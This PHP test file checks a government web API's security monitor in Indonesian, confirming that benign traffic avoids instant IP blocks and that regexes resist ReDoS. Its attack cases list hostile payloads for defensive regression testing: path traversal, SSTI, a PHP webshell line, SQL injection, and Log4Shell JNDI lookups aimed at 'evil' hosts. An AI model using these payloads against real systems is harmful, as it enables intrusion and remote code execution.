<?php

use Internal\SecurityMonitor\Models\BlockedIp;
use Internal\SecurityMonitor\Services\SecurityMonitorService;

/**
 * Penjaga keseimbangan pola deteksi:
 *
 *  - lalu lintas nyata (teks berbahasa Indonesia, placeholder dokumen, path
 *    server sendiri, klien HTTP sah) TIDAK boleh memicu blokir instan;
 *  - pola serangan yang sudah diketahui HARUS tetap terdeteksi (tidak ada
 *    regresi saat pola lain dirapatkan);
 *  - pola tidak boleh rawan ReDoS (input adversarial tetap diproses cepat).
 *
 * Daftar kasus di bawah berasal dari audit pola pada insiden marker "wne":
 * sebelum perbaikan terdapat 14 false positive dari 24 input nyata, enam di
 * antaranya memicu blokir instan 30 hari.
 */
function detectorLegitCases(): array
{
    return [
        'teks berita dengan --' => ['body' => 'Pekanbaru -- Pemerintah Kota Pekanbaru mengumumkan pelayanan daring'],
        'legal doc dengan --' => ['body' => 'Pasal 1 -- Ketentuan Umum berlaku sejak tanggal ditetapkan'],
        'nama layanan dengan --' => ['body' => 'Layanan -- Cepat'],
        'path deploy aplikasi' => ['body' => '/var/www/superapp-api.pekanbaru.go.id/kominfo-superapp-api/public'],
        'placeholder {{ nama - jabatan }}' => ['body' => 'Dokumen untuk {{ nama - jabatan }}'],
        'placeholder {{ tanggal-laporan }}' => ['body' => 'Isi {{ tanggal-laporan }} di sini'],
        'placeholder {{nama}}-{{alamat}}' => ['body' => 'Surat {{nama}}-{{alamat}}'],
        'NIK 16 digit' => ['body' => 'NIK 1471010101900001'],
        'rentang tanggal' => ['query' => 'from=2026-01-01&to=2026-12-31'],
        'UA python-httpx' => ['user_agent' => 'python-httpx/0.27.0'],
        'UA Photon' => ['user_agent' => 'Photon/1.0'],
        'UA Zapier' => ['user_agent' => 'Zapier/1.2.3'],
        'UA okhttp' => ['user_agent' => 'okhttp/4.9.0'],
        'UA Dart' => ['user_agent' => 'Dart/3.5 (dart:io)'],
        'UA WhatsApp' => ['user_agent' => 'WhatsApp/2.24.1 A'],
        'aset publik dengan spasi' => ['path' => '/assets/kerentanan/kerentanan hasil 1.png'],
        'aset build vite' => ['path' => '/build/assets/app-vXTu0V4A.js'],
        'filename dengan --' => ['filename' => 'Surat -- 2026.pdf'],
        'filename dengan titik ganda' => ['filename' => 'Laporan..2026.pdf'],
        'referer normal' => ['referer' => 'https://superapp-api.pekanbaru.go.id/services'],
        'template literal JS' => ['body' => 'const pesan = `Halo ${nama}, total ${total}`;'],
        'query pencarian warga' => ['query' => 'search=laporan+masyarakat'],
    ];
}

/**
 * Kasus yang sudah dipastikan tidak boleh terdeteksi sama sekali (bukan hanya
 * "tidak instan"), karena muncul pada konten admin sehari-hari.
 *
 * "SELECT ... FROM" dan path Windows pada teks bebas sengaja TIDAK termasuk di
 * sini: keduanya tetap tercatat (log-only) sebagai trade-off yang didokumentasi
 * pada DOCS/security-monitor.md.
 */
function detectorMustBeCleanCases(): array
{
    return [
        'teks berita dengan --',
        'legal doc dengan --',
        'nama layanan dengan --',
        'path deploy aplikasi',
        'placeholder {{ nama - jabatan }}',
        'placeholder {{ tanggal-laporan }}',
        'placeholder {{nama}}-{{alamat}}',
        'UA python-httpx',
        'filename dengan --',
        'filename dengan titik ganda',
    ];
}

/**
 * @return array<string, array{0: array<string, string>, 1: bool}> haystack + wajib blokir instan
 */
function detectorAttackCases(): array
{
    return [
        'null byte' => [['query' => 'icon=wne.php%00.jpg'], true],
        'double extension' => [['body' => 'icon=shell.php.jpg'], true],
        'separator titik-koma' => [['filename' => 'wne.php;.jpg'], true],
        'separator spasi' => [['filename' => 'wne.php .jpg'], true],
        'traversal di body' => [['body' => 'icon=../../../public/wne'], true],
        'traversal di path' => [['path' => '/../../etc/passwd'], true],
        'traversal filename backslash' => [['filename' => '..\\..\\wne.jpg'], true],
        'traversal filename encoded' => [['filename' => '..%2f..%2fwne.jpg'], false],
        'probe .env' => [['path' => '/.env'], true],
        'probe .env lewat query' => [['path' => '/index.php', 'query' => 'file=.env'], false],
        'os probe win.ini' => [['path' => '/windows/win.ini'], true],
        'webshell path' => [['path' => '/wne.php'], true],
        'webshell lewat filename' => [['filename' => 'wne.php%00.jpg'], true],
        'ssti 7*7' => [['query' => 'q={{7*7}}'], true],
        'ssti 7-7' => [['query' => 'q={{7-7}}'], true],
        'ssti kutip' => [['query' => "q={{7*'7'}}"], true],
        'ssti a+b' => [['query' => 'q={{a+b}}'], true],
        'ssti dollar' => [['query' => 'q=${7*7}'], true],
        'ssti erb' => [['query' => 'q=<%= 7*7 %>'], true],
        'ssti keyword' => [['query' => 'q={{ self }}'], true],
        'ssti uname' => [['query' => 'q=uname -a'], true],
        'php injection' => [['body' => 'x=<?php system($_GET[0]); ?>'], true],
        'sql union' => [['query' => 'id=1+union+select+password+from+users'], false],
        'sql komentar kutip tunggal' => [['query' => "id=1'--"], false],
        'sql komentar kutip ganda' => [['query' => 'id=1" --'], false],
        'sql komentar di akhir' => [['query' => 'id=1 --'], false],
        'sql or 1=1' => [['query' => 'id=1 or 1=1--'], false],
        'secret exposure' => [['query' => 'DB_PASSWORD=rahasia'], true],
        'double encoded traversal' => [['path-decoded' => '%2e%2e%2f%2e%2e%2fetc%2fpasswd'], false],
        'scanner sqlmap' => [['user_agent' => 'sqlmap/1.7.2#stable'], true],
        'scanner ZAP' => [['user_agent' => 'Mozilla/5.0 ZAP/2.14.0'], true],
        'log4shell UA' => [['user_agent' => '${jndi:ldap://127.0.0.1:1389/a}'], true],
        'log4shell UA uppercase' => [['user_agent' => '${JNDI:LDAPS://evil:1389/a}'], true],
        'log4shell UA obfuscated' => [['user_agent' => '${${lower:j}ndi:ldap://evil/a}'], true],
        'log4shell nested obfuscation' => [['body' => '${j${lower:n}di:dns://evil/a}'], true],
        'log4shell query decoded' => [['query-decoded' => 'q=${jndi:rmi://evil/a}'], true],
        'log4shell body' => [['body' => 'x=${jndi:ldaps://evil:1389/a}'], true],
        'log4shell encoded query' => [['query' => 'q=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D'], true],
    ];
}

function detectorFindRule(array $threats, string $rule): ?array
{
    foreach ($threats as $threat) {
        if ($threat['rule'] === $rule) {
            return $threat;
        }
    }

    return null;
}

function detectorFormat(array $threats): string
{
    if ($threats === []) {
        return '(tidak terdeteksi)';
    }

    return implode(', ', array_map(
        fn (array $threat) => $threat['rule'].'['.$threat['level'].']'.(($threat['instant'] ?? false) ? ' INSTANT' : ''),
        $threats
    ));
}

test('lalu lintas nyata tidak pernah memicu blokir instan', function () {
    $service = app(SecurityMonitorService::class);

    foreach (detectorLegitCases() as $label => $haystacks) {
        $threats = $service->inspectHaystacks($haystacks);

        $instant = array_values(array_filter($threats, fn (array $threat) => ($threat['instant'] ?? false) === true));

        expect($instant)->toBe([], sprintf(
            'Input nyata "%s" memicu blokir instan %d hari: %s',
            $label,
            (int) config('security.instant_block.duration_hours'),
            detectorFormat($instant)
        ));
    }
});

test('konten admin sehari-hari tidak terdeteksi sama sekali', function () {
    $service = app(SecurityMonitorService::class);
    $cases = detectorLegitCases();

    foreach (detectorMustBeCleanCases() as $label) {
        $threats = $service->inspectHaystacks($cases[$label]);

        expect($threats)->toBe([], sprintf(
            'Input nyata "%s" terdeteksi sebagai serangan: %s',
            $label,
            detectorFormat($threats)
        ));
    }
});

test('pola serangan tetap terdeteksi setelah pola dirapatkan', function () {
    $service = app(SecurityMonitorService::class);

    foreach (detectorAttackCases() as $label => [$haystacks, $expectsInstant]) {
        $threats = $service->inspectHaystacks($haystacks);

        expect($threats)->not->toBe([], "Payload \"{$label}\" tidak terdeteksi sama sekali");

        if ($expectsInstant) {
            expect($service->shouldInstantBlock($threats))->toBeTrue(
                "Payload \"{$label}\" seharusnya memicu blokir instan, hasil: ".detectorFormat($threats)
            );
        }
    }
});

test('pola deteksi tidak rawan ReDoS', function () {
    $service = app(SecurityMonitorService::class);
    $max = max(500, (int) config('security.max_inspect_length', 4000));

    $payloads = [
        'php + spasi' => '.php'.str_repeat(' ', $max),
        'titik-koma berulang' => '.php'.str_repeat(';', $max),
        'titik berulang' => '.php'.str_repeat('.', $max),
        'ssti operator berulang' => '{{'.str_repeat('a+', $max),
        'ssti spasi berulang' => '{{ a '.str_repeat(' ', $max),
        'php tag + slash' => '<?php '.str_repeat('/', $max),
        'preg /e + bintang' => 'preg_replace("/'.$max.str_repeat('*', $max),
        'select + spasi' => 'select'.str_repeat(' ', $max).'from',
        'kurung siku berulang' => '{{'.str_repeat('[', $max),
        'traversal berulang' => str_repeat('../', $max),
        'null byte berulang' => str_repeat('%00', $max),
    ];

    foreach ($payloads as $label => $payload) {
        $start = hrtime(true);
        $service->inspectHaystacks(['body' => substr($payload, 0, $max)]);
        $elapsedMs = (hrtime(true) - $start) / 1_000_000;

        expect($elapsedMs)->toBeLessThan(50.0, sprintf(
            'Payload "%s" memerlukan %.1f ms untuk %d karakter',
            $label,
            $elapsedMs,
            $max
        ));
    }
});

test('blokir instan aktif pada percobaan pertama lewat request sungguhan', function () {
    config()->set('security.whitelist', []);

    $this->withServerVariables(['REMOTE_ADDR' => '198.51.100.70']);

    // Placeholder dokumen yang sah tidak boleh memblokir siapa pun.
    $this->post('/login', [
        'email' => 'admin@pekanbaru.go.id',
        'password' => 'KataSandi#2026',
        'catatan' => 'Dokumen untuk {{ nama - jabatan }} -- Pekanbaru',
    ])->assertRedirect();

    expect(BlockedIp::query()->count())->toBe(0);

    // Payload nyata tetap diblokir pada request pertama.
    $this->get('/?q=%7B%7B7*7%7D%7D')->assertForbidden();

    expect(BlockedIp::query()->where('ip_address', '198.51.100.70')->exists())->toBeTrue();
});
